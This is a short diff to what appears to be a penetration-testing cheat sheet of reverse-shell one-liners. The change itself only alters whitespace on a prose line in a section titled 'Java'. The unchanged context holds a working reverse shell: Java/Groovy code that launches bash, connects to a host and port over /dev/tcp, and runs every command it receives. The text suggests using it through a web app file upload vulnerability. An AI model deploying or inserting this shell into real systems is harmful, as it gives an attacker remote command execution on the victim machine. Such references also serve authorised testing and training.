@@ -34,7 +34,8 @@ Good ol' PERL, nearly every system has it and is a cornerstone of utility -
 
 ### 6. Java
 
-This is a pretty obscure / esoteric method but there might be a chance you might come across using this  (probably during a web app file upload vuln ? )
+This is a pretty obscure / esoteric method but there might be a chance you might come across using this  (probably during a web app file upload vuln ? )-  
+
 	r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
